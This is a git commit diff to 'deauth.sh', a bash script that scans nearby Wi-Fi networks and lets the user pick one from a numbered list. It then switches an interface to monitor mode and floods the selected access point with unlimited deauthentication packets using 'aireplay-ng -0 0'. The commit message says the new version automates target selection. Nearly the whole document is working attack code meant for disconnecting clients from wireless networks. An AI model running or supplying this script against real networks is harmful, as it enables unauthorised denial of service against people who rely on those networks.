711f3163c58b11a2cd7c68541dec9416647a0259
YAKM0 <112671796+YAKM0@users.noreply.github.com>
2022-09-03 13:20:13 -0500

    deauth.sh V2.0
    Now instead of copying and pasting BSSID and Channel, it is automatically done for you when selecting from list.

--- deauth.sh
+++ deauth.sh
@@ -12,18 +12,29 @@ Twitter: @Y4KM0           | hack all the things. -dualcore
 mon='mon'
 sleep 5
 clear
-echo "========================================================================"
-nmcli dev wifi | awk '$2 != "--"' |awk '{print NR,$1,$2,$4}'
-echo "========================================================================"
-sleep 1
-echo "
-Copy targets BSSID and paste below WITH NO EXTRA SPACING
-"
-read Target
-sleep 2
-echo "type Targets channel below, channel number comes after network name, EX. target_network 6"
-read Chan
+
+
+nmcli dev wifi | awk '$2 != "--"' |awk '{print $1,$2,$4}' | awk -F : '$2!="" && $3!=""' | awk '{print NR,$1,$2,$3}' > input.txt
+echo "========================================================================================"
+nmcli dev wifi | awk '$2 != "--"' |awk '{print $1,$2,$4}' | awk -F : '$2!="" && $3!=""' | awk '{print NR,$1,$2,$3}'
+echo "========================================================================================"
+echo "which network would you like to deauth? (type number on left)"
+read num
+head -n $num input.txt | tail -1 > input2.txt
+Bssid=$(cat input2.txt | awk '{print $2}')
+chan=$(cat input2.txt | awk '{print $4}')
+ssid=$(cat input2.txt | awk '{print $3}')
+while true; do
+    read -p "You chose $ssid, is this correct? " yp
+    case $yp in
+        [Yy]* ) break;;
+        [Nn]* ) exit;;
+        * ) echo "Please answer yes or no.";;
+    esac
+done
+
 clear
+ifconfig
 echo "You must start an interface in managed mode, ex. wlan0. Type which interface you want to start in managed mode below:"
 read interface
 while true; do
@@ -36,8 +47,8 @@ while true; do
 done
 sudo airmon-ng start $interface > /dev/null 2>&1
 clear
-sudo timeout 2s airodump-ng -d $Target -c $Chan $interface$mon > /dev/null 2>&1
-sudo aireplay-ng -0 0 -a $Target $interface$mon --ignore-negative-one
+sudo timeout 2s airodump-ng -d $Bssid -c $chan $interface$mon > /dev/null 2>&1
+sudo aireplay-ng -0 0 -a $Bssid $interface$mon --ignore-negative-one
 sleep 3
 clear
 echo "Returning to managed mode"
